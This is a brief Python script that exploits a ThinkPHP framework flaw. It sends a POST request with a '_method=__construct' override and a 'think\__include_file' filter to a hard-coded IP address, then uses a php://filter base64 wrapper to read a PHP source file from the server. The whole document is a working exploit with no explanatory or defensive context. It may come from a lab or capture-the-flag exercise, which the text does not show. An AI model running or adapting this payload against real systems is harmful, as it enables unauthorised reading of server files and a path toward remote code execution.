import requests
url = "http://101.32.184.39/index.php"
data = {
    "_method":"__construct",
    "method":"GET",
    "filter[]":"think\__include_file",
    "server[]":"1",
    "get[]":"PHP://filter/read=convert.base64-encode/resource=/var/www/html/thinkphp/library/think/console/command/Help.php"
}
response=requests.post(url=url,data=data)

print(response.text)